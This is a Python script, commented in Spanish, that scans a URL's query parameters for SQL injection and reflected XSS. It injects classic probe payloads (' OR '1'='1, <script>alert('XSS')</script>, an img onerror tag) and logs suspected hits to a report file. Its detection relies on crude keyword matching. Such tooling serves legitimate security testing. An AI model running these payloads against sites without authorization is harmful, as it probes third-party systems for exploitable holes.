import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from colorama import Fore, Style, init
from datetime import datetime

# Inicializar colorama
init(autoreset=True)

# Payloads simples
payloads = [
    "'", "\"", "' OR '1'='1", "'--", "'#",
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>"
]

# Headers comunes
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)"
}

# Validación básica de URL


def is_valid_url(url):
    try:
        result = urlparse(url)
        return all([result.scheme in ["http", "https"], result.netloc, result.query])
    except Exception:
        return False

# Función principal de escaneo


def scan_url(url):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    if not params:
        print(
            Fore.RED + "[✘] La URL debe contener al menos un parámetro (?id=1, etc.)")
        return

    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    report_file = f"report_{timestamp}.txt"

    print(Fore.CYAN +
          f"\n[~] Iniciando escaneo de {len(params)} parámetros...\n")

    with open(report_file, "w", encoding="utf-8") as report:
        for param in params:
            for payload in payloads:
                test_params = params.copy()
                test_params[param] = [payload]  # Mantener tipo correcto
                new_query = urlencode(test_params, doseq=True)
                new_url = urlunparse(parsed._replace(query=new_query))

                try:
                    r = requests.get(new_url, headers=headers, timeout=5)
                    content = r.text.lower()

                    if any(x in content for x in ["sql", "syntax", "mysql", "query failed"]):
                        result = f"[SQLi] Parámetro: {param} | Payload: {payload}"
                        print(Fore.YELLOW + result)
                        report.write(result + "\n")

                    if "<script>alert('xss')</script>" in content or "xss" in content:
                        result = f"[XSS] Parámetro: {param} | Payload: {payload}"
                        print(Fore.MAGENTA + result)
                        report.write(result + "\n")

                except requests.exceptions.RequestException as e:
                    print(Fore.RED + f"[!] Error en {new_url} → {e}")

    print(Fore.GREEN +
          f"\n✔ Escaneo finalizado. Resultados guardados en: {report_file}\n")


# Input del usuario
if __name__ == "__main__":
    url = input(
        "🔗 Ingresa la URL para probar (ej: http://example.com/page.php?id=1): ").strip()

    if not is_valid_url(url):
        print(
            Fore.RED + "[✘] URL no válida o sin parámetros. Ej: http://site.com/index.php?id=1")
    else:
        scan_url(url)
